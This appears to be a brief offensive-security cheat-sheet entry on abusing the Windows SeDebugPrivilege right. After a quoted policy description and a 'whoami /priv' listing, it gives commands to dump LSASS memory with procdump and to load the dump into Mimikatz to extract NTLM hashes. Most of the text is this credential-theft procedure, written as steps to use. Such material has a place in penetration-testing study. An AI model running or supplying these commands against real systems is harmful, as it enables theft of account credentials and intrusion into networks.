This policy setting determines which users can attach to or open any process, even a process they do not own. Developers who are debugging their applications do not need this user right. Developers who are debugging new system components need this user right. This user right provides access to sensitive and critical operating system components.

```bash
C:\Windows\system32>whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                    State
============================= ============================== ========
SeDebugPrivilege              Debug programs                 Disabled
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set Disabled
```

Dump Lsass

```bash
procdump.exe -accepteula -ma lsass.exe lsass.dmp
```

Load .dmp file into Mimikatz to extract NTLM hashes:

```bash
mimikatz.exe
mimikatz # log
mimikatz # sekurlsa::minidump lsass.dmp
```




